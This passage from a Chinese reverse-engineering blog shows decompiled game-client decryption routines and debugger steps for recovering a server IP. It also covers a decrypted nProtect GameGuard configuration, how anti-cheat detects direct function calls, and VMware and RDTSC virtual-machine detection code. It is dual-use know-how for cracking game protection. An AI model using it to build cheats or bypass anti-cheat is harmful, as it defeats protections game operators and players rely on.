kr00_4</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  __int16 v16; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  _DWORD *v18; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line">  __int16 *v19; <span class="comment">// [esp+18h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  v16 = *a2;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 == <span class="number">-5061</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a2 + <span class="number">4</span>;</span><br><span class="line">    v6 = a2 + <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a2 + <span class="number">2</span>;</span><br><span class="line">    v6 = a2 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v18 = v5;</span><br><span class="line">  v19 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *result ^ *(_DWORD *)a2;</span><br><span class="line">    *(_DWORD *)a2 = v7;</span><br><span class="line">    v8 = *(_DWORD *)(result[<span class="number">3</span>] + <span class="number">4</span> * result[<span class="number">2</span>] * (v7 &amp; <span class="number">0x3FFF</span>));</span><br><span class="line">    <span class="keyword">if</span> ( v16 == <span class="number">-5061</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v8 ^ *((_DWORD *)a2 + <span class="number">1</span>);</span><br><span class="line">      *((_DWORD *)a2 + <span class="number">1</span>) = v9;</span><br><span class="line">      v8 = *(_DWORD *)(result[<span class="number">3</span>] + <span class="number">4</span> * result[<span class="number">2</span>] * (v9 &amp; <span class="number">0x3FFF</span>));</span><br><span class="line">      a3 -= <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a3 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt;&gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = a3 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v11 = v8 ^ *(_DWORD *)v6;</span><br><span class="line">        *(_DWORD *)v6 = v11;</span><br><span class="line">        v8 = *(_DWORD *)(result[<span class="number">3</span>] + <span class="number">4</span> * result[<span class="number">2</span>] * (v11 &amp; <span class="number">0x3FFF</span>));</span><br><span class="line">        v6 += <span class="number">2</span>;</span><br><span class="line">        --v10;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v10 );</span><br><span class="line">      v19 = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = ~dword_B652DC[a3 &amp; <span class="number">3</span>];			<span class="comment">// 00B652DC+2*4   ffff0000     </span></span><br><span class="line">    v12 = a3 &amp; <span class="number">3</span>;</span><br><span class="line">    a3 = *(_DWORD *)v6 ^ v8 &amp; v17;</span><br><span class="line">    <span class="built_in">qmemcpy</span>(v6, &amp;a3, v12);</span><br><span class="line">    v13 = a3;</span><br><span class="line">    *(_DWORD *)v19 = a3;</span><br><span class="line">    *v18 = *(_DWORD *)(result[<span class="number">3</span>] + <span class="number">4</span> * result[<span class="number">2</span>] * (v8 &amp; <span class="number">0x3FFF</span>)) ^ v13 &amp; v17;</span><br><span class="line">    v14 = (result[<span class="number">1</span>] + <span class="number">1</span>) &amp; <span class="number">0x3FFF</span>;</span><br><span class="line">    v15 = v14 * result[<span class="number">2</span>];</span><br><span class="line">    result[<span class="number">1</span>] = v14;</span><br><span class="line">    *result = *(_DWORD *)(result[<span class="number">3</span>] + <span class="number">4</span> * v15);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解密函数分析-2"><a class="markdownIt-Anchor" href="#解密函数分析-2">#</a> 解密函数分析</h3>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">004</span>A7E33   .  <span class="number">50</span>            push eax								<span class="number">194B</span>E318</span><br><span class="line"><span class="number">004</span>A7E34   .  FF76 <span class="number">04</span>       push dword ptr ds:[esi+<span class="number">0x4</span>]				</span><br><span class="line"><span class="number">004</span>A7E37   .  FF15 <span class="number">94660E01</span> call dword ptr ds:[<span class="number">0x10E6694</span>]            ;  Main<span class="number">.01100553</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下硬件访问断点</span></span><br><span class="line"><span class="number">194B</span>E318      C0 <span class="number">00</span> <span class="number">73</span> <span class="number">04</span> <span class="number">70</span> <span class="number">52</span> <span class="number">21</span> <span class="number">19</span>                          ?spR!.</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="number">004</span>A3E52  /&gt; \<span class="number">55</span>            push ebp</span><br><span class="line"><span class="number">004</span>A3E53  |.  <span class="number">8B</span>EC          mov ebp,esp</span><br><span class="line"><span class="number">004</span>A3E55  |.  <span class="number">53</span>            push ebx</span><br><span class="line"><span class="number">004</span>A3E56  |.  <span class="number">8B</span>5D <span class="number">0</span>C       mov ebx,[arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A3E59  |.  <span class="number">56</span>            push esi</span><br><span class="line"><span class="number">004</span>A3E5A  |.  <span class="number">8B</span>75 <span class="number">08</span>       mov esi,[arg<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A3E5D  |.  <span class="number">8B</span>06          mov eax,dword ptr ds:[esi]</span><br><span class="line"><span class="number">004</span>A3E5F  |.  <span class="number">57</span>            push edi</span><br><span class="line"><span class="number">004</span>A3E60  |.  <span class="number">8B</span>79 <span class="number">0</span>C       mov edi,dword ptr ds:[ecx+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3E63  |.  <span class="number">8B</span>C8          mov ecx,eax</span><br><span class="line"><span class="number">004</span>A3E65  |.  <span class="number">81F</span>1 F18CB37A <span class="keyword">xor</span> ecx,<span class="number">0x7AB38CF1</span></span><br><span class="line"><span class="number">004</span>A3E6B  |.  <span class="number">890</span>E          mov dword ptr ds:[esi],ecx</span><br><span class="line"><span class="number">004</span>A3E6D  |.  <span class="number">83</span>EB <span class="number">04</span>       sub ebx,<span class="number">0x4</span></span><br><span class="line"><span class="number">004</span>A3E70  |.  <span class="number">8</span>D56 <span class="number">04</span>       lea edx,dword ptr ds:[esi+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">004</span>A3E73  |.  <span class="number">8B</span>CB          mov ecx,ebx</span><br><span class="line"><span class="number">004</span>A3E75  |.  BE FF3F0000   mov esi,<span class="number">0x3FFF</span></span><br><span class="line"><span class="number">004</span>A3E7A  |.  <span class="number">23</span>C6          <span class="keyword">and</span> eax,esi</span><br><span class="line"><span class="number">004</span>A3E7C  |.  <span class="number">8B</span>0487        mov eax,dword ptr ds:[edi+eax*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3E7F  |.  C1E9 <span class="number">02</span>       shr ecx,<span class="number">0x2</span></span><br><span class="line"><span class="number">004</span>A3E82  |.  <span class="number">85</span>C9          test ecx,ecx</span><br><span class="line"><span class="number">004</span>A3E84  |.  <span class="number">7</span>E <span class="number">16</span>         jle XMain<span class="number">.004</span>A3E9C</span><br><span class="line"><span class="number">004</span>A3E86  |.  <span class="number">894</span>D <span class="number">08</span>       mov [arg<span class="number">.1</span>],ecx</span><br><span class="line"><span class="number">004</span>A3E89  |&gt;  <span class="number">8B</span>0A          /mov ecx,dword ptr ds:[edx]</span><br><span class="line"><span class="number">004</span>A3E8B  |.  <span class="number">33</span>C1          |<span class="keyword">xor</span> eax,ecx</span><br><span class="line"><span class="number">004</span>A3E8D  |.  <span class="number">8902</span>          |mov dword ptr ds:[edx],eax</span><br><span class="line"><span class="number">004</span>A3E8F  |.  <span class="number">23</span>CE          |<span class="keyword">and</span> ecx,esi</span><br><span class="line"><span class="number">004</span>A3E91  |.  <span class="number">8B</span>048F        |mov eax,dword ptr ds:[edi+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3E94  |.  <span class="number">83</span>C2 <span class="number">04</span>       |add edx,<span class="number">0x4</span></span><br><span class="line"><span class="number">004</span>A3E97  |.  FF4D <span class="number">08</span>       |dec [arg<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A3E9A  |.^ <span class="number">75</span> ED         \jnz XMain<span class="number">.004</span>A3E89</span><br><span class="line"><span class="number">004</span>A3E9C  |&gt;  <span class="number">83E3</span> <span class="number">03</span>       <span class="keyword">and</span> ebx,<span class="number">0x3</span></span><br><span class="line"><span class="number">004</span>A3E9F  |.  <span class="number">8B</span>0C9D F052B6&gt;mov ecx,dword ptr ds:[ebx*<span class="number">4</span>+<span class="number">0xB652F0</span>]</span><br><span class="line"><span class="number">004</span>A3EA6  |.  <span class="number">5F</span>            pop edi</span><br><span class="line"><span class="number">004</span>A3EA7  |.  F7D1          <span class="keyword">not</span> ecx</span><br><span class="line"><span class="number">004</span>A3EA9  |.  <span class="number">23</span>C8          <span class="keyword">and</span> ecx,eax</span><br><span class="line"><span class="number">004</span>A3EAB  |.  <span class="number">310</span>A          <span class="keyword">xor</span> dword ptr ds:[edx],ecx</span><br><span class="line"><span class="number">004</span>A3EAD  |.  <span class="number">5</span>E            pop esi</span><br><span class="line"><span class="number">004</span>A3EAE  |.  <span class="number">5B</span>            pop ebx</span><br><span class="line"><span class="number">004</span>A3EAF  |.  <span class="number">5</span>D            pop ebp</span><br><span class="line"><span class="number">004</span>A3EB0  \.  C2 <span class="number">0800</span>       retn <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_4A3E52</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="type">int</span> *a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a2;</span><br><span class="line">  v4 = <span class="keyword">this</span>[<span class="number">3</span>];</span><br><span class="line">  *a2 ^= <span class="number">0x7AB38CF1</span>u;</span><br><span class="line">  v5 = a3 - <span class="number">4</span>;</span><br><span class="line">  v6 = a2 + <span class="number">1</span>;</span><br><span class="line">  result = *(_DWORD *)(v4 + <span class="number">4</span> * (v3 &amp; <span class="number">0x3FFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(a3 - <span class="number">4</span>) &gt;&gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = v5 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *v6;</span><br><span class="line">      *v6 ^= result;</span><br><span class="line">      result = *(_DWORD *)(v4 + <span class="number">4</span> * (v8 &amp; <span class="number">0x3FFF</span>));</span><br><span class="line">      ++v6;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  *v6 ^= result &amp; ~dword_B652F0[v5 &amp; <span class="number">3</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解密ip分析"><a class="markdownIt-Anchor" href="#解密ip分析">#</a> 解密 IP 分析</h3>
<p>在弹窗的时候去 OD 搜索字符串，注意切换到 dll 中搜索</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231022173327993.png" alt="image-20231022173327993"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231022173457771.png" alt="image-20231022173457771"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">68F81058    6A 00           push 0x0</span><br><span class="line">68F8105A    6A 00           push 0x0</span><br><span class="line">68F8105C    68 3042F868     push cabal_ho.68F84230                   ; language.enc Debug!!!!</span><br><span class="line">68F81061    6A 00           push 0x0</span><br><span class="line">68F81063    FF15 D440F868   call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;&gt;; USER32.MessageBoxA</span><br><span class="line">68F81069    8B4424 20       mov eax,dword ptr ss:[esp+0x20]</span><br><span class="line"></span><br><span class="line">00501E0B   .  55            push ebp                                 ; /hTemplateFile =&gt; NULL</span><br><span class="line">00501E0C   .  68 80000000   push 0x80                                ; |Attributes = NORMAL</span><br><span class="line">00501E11   .  6A 03         push 0x3                                 ; |Mode = OPEN_EXISTING</span><br><span class="line">00501E13   .  55            push ebp                                 ; |pSecurity =&gt; NULL</span><br><span class="line">00501E14   .  6A 01         push 0x1                                 ; |ShareMode = FILE_SHARE_READ</span><br><span class="line">00501E16   .  68 00000080   push 0x80000000                          ; |Access = GENERIC_READ</span><br><span class="line">00501E1B   .  57            push edi                                 ; |FileName</span><br><span class="line">00501E1C   .  FF15 18600E01 call dword ptr ds:[0x10E6018]            ; \CreateFileA</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>VirtualProtectEx 修改分页内存属性</p>
<ol>
<li>
<p>加载套接字库，创建套接字（WSAStartup ()/socket ()）；</p>
</li>
<li>
<p>向服务器发出连接请求（connect ()）；</p>
</li>
<li>
<p>和服务器进行通信（send ()/recv ()）；</p>
</li>
<li>
<p>关闭套接字，关闭加载的套接字库（closesocket ()/WSACleanup ()）</p>
</li>
</ol>
<h2 id="nprotect"><a class="markdownIt-Anchor" href="#nprotect">#</a> nprotect</h2>
<ol>
<li>nProtect GameGuard 含有即时变换侦测规则、可置于游戏可执行文件前使用，利用动态加密的方式达到防止游戏外挂的目的，有效防堵作弊程序（如加速器），以及侦测玩</li>
<li>家电脑有没有使用游戏插件等。</li>
<li>nProtect GameGuard 具有多种功能，例如：</li>
<li>透过持续扫描任何事先有登录过的代码、系统内部时间器运作等方式，侦测玩家电脑有没有使用游戏插件。</li>
<li>检测及阻挡恶意代码。</li>
<li>自动扫描工具。</li>
<li>即时变换侦测。</li>
<li>可停止鼠标及键盘的驱动程序及侧录程序。</li>
<li>可阻挡玩家及双重核心处理器（CPU）之不正当的操作。</li>
<li>占用甚少 CPU，不会拖慢电脑及游戏。</li>
<li>监控玩家之操作环境，以及一举一动</li>
</ol>
<h3 id="nprotect-gameguard-ini文件破解手法之解密后的文件一"><a class="markdownIt-Anchor" href="#nprotect-gameguard-ini文件破解手法之解密后的文件一">#</a> NProtect GameGuard ini 文件破解手法之解密后的文件（一）</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">配置文件解密后的：</span><br><span class="line">[GAMEMON]</span><br><span class="line">GAME_NAME=*</span><br><span class="line">UPDATE_SERVER=*</span><br><span class="line">UPDATE_PATH=/real/</span><br><span class="line">BACKUP_SERVER=</span><br><span class="line">BACKUP_PATH=</span><br><span class="line">OPTION_VALUE=<span class="number">0</span></span><br><span class="line">SPEEDCHECK_INTERVAL=<span class="number">1000</span></span><br><span class="line">SENDERRLOG=<span class="number">3</span></span><br><span class="line">GAMECRC=<span class="number">1</span></span><br><span class="line">USE_GGSCAN=<span class="number">1</span></span><br><span class="line">LOG_SERVER=*</span><br><span class="line">NO_USE_CHECKSC=<span class="number">1</span></span><br><span class="line">NO_USE_CSR=<span class="number">1</span></span><br><span class="line">USE_FHSH=<span class="number">1</span></span><br><span class="line">BWTSERVER=bwt.nprotect2.net</span><br><span class="line">BWT_OPTION=<span class="number">1</span></span><br><span class="line">USE_IHMON=<span class="number">1</span></span><br><span class="line">RT_UPDATE=<span class="number">1</span></span><br><span class="line">RT_UPTIME=<span class="number">7200</span></span><br><span class="line">RT_ENDTIME=<span class="number">30</span></span><br><span class="line">NO_PHIDE=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img data-src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="img"><img data-src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h3 id="nprotect-gameguard-ini文件破解手法之解密函数二"><a class="markdownIt-Anchor" href="#nprotect-gameguard-ini文件破解手法之解密函数二">#</a> NProtect GameGuard ini 文件破解手法之解密函数（二）</h3>
<p>对 LoadLibraryA 下段</p>
<h2 id="游戏检测的对抗与防护艺术"><a class="markdownIt-Anchor" href="#游戏检测的对抗与防护艺术">#</a> 游戏检测的对抗与防护艺术</h2>
<ol>
<li>
<p>从游戏外挂的利用角度来看，外挂的行为无非有如下两种：</p>
</li>
<li>
<p>修改游戏的关键数据和代码：属于篡改行为</p>
</li>
<li>
<p>call 游戏函数：属于未授权访问行为</p>
</li>
<li>
<p>游戏设计者针对这两种行为产生了无数的防护机制。然而道高一尺魔高一尺，逆向人员也根据游戏内的反外挂机制衍生出了相应的对抗手段。</p>
</li>
</ol>
<p>栈回溯检测调用 call</p>
<p>xdbg 中 call stack</p>
<h3 id="call的检测原理"><a class="markdownIt-Anchor" href="#call的检测原理">#</a> call 的检测原理</h3>
<p>当我们正常在游戏中吃药是没有检测的，那是因为我们完完整整的把游戏的代码全部调用了；而我们直接点吃药 call 的时候执行的代码是不完全的。</p>
<p>那么游戏的开发者就可以在吃药 call 的外层设置一个变量，并且给变量赋值，然后在吃药 call 内层的某一个位置对这个变量的值进行检测。如果值不对，说明代码没有被完全执行。</p>
<p>在检测完成之后，再修改这个变量的值到原始状态，然后进行下一次检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//用于检测的全局变量</span><br><span class="line">int status=0;</span><br><span class="line"></span><br><span class="line">function()</span><br><span class="line">&#123;</span><br><span class="line">    //调用其他代码...........</span><br><span class="line">    status=1;</span><br><span class="line">    吃药call();</span><br><span class="line">     //调用其他代码...........</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">吃药call()</span><br><span class="line">&#123;</span><br><span class="line">     //调用其他代码...........</span><br><span class="line">    if(status==1)</span><br><span class="line">    &#123;</span><br><span class="line">        //正常执行代码</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        //检测到外挂 进行处理</span><br><span class="line">    &#125;</span><br><span class="line">    //再对status进行赋初始值 以便进行下一次检测</span><br><span class="line">    status=0;</span><br><span class="line">     //调用其他代码...........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="虚拟机检测"><a class="markdownIt-Anchor" href="#虚拟机检测">#</a> 虚拟机检测</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line">虚拟机后门检测（IN）</span><br><span class="line"></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push   edx</span><br><span class="line">		push   ecx</span><br><span class="line">		push   ebx</span><br><span class="line">		mov    eax, &#x27;VMXh&#x27;</span><br><span class="line">		mov    ebx, 0  // 将ebx设置为非幻数’VMXH’的其它值</span><br><span class="line">		mov    ecx, 10 // 指定功能号，用于获取VMWare版本，当它为x14时用于获取VMware内存大小</span><br><span class="line">		mov    edx, &#x27;VX&#x27; // 端口号</span><br><span class="line">		in     eax, dx // 从端口dx读取VMware版本到eax</span><br><span class="line">		//若上面指定功能号为x14时，可通过判断eax中的值是否大于，若是则说明处于虚拟机中</span><br><span class="line">		cmp    ebx, &#x27;VMXh&#x27; // 判断ebx中是否包含VMware版本’VMXh’，若是则在虚拟机中</span><br><span class="line">		setz   [rc] // 设置返回值</span><br><span class="line">		pop    ebx</span><br><span class="line">		pop    ecx</span><br><span class="line">		pop    edx</span><br><span class="line">	&#125;</span><br><span class="line">	rc = true;</span><br><span class="line">&#125;</span><br><span class="line">__except(EXCEPTION_EXECUTE_HANDLER)  //如果未处于VMware中，则触发此异常</span><br><span class="line">&#123;</span><br><span class="line">	rc = false;</span><br><span class="line">&#125;    虚拟机中IN读取指定端口不会异常，如果异常了为真实机。</span><br><span class="line"></span><br><span class="line">///////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">时间戳指令检测</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">		push eax</span><br><span class="line">		RDTSC</span><br><span class="line">		mov ifirst,eax</span><br><span class="line">		RDTSC</span><br><span class="line">		mov isecond,eax</span><br><span class="line">		pop eax</span><br><span class="line">	&#125;</span><br><span class="line">	isub = isecond - ifirst;</span><br><span class="line">	if (isub &gt; 0x0ff)   //判断两次之差是否大于0xff</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span 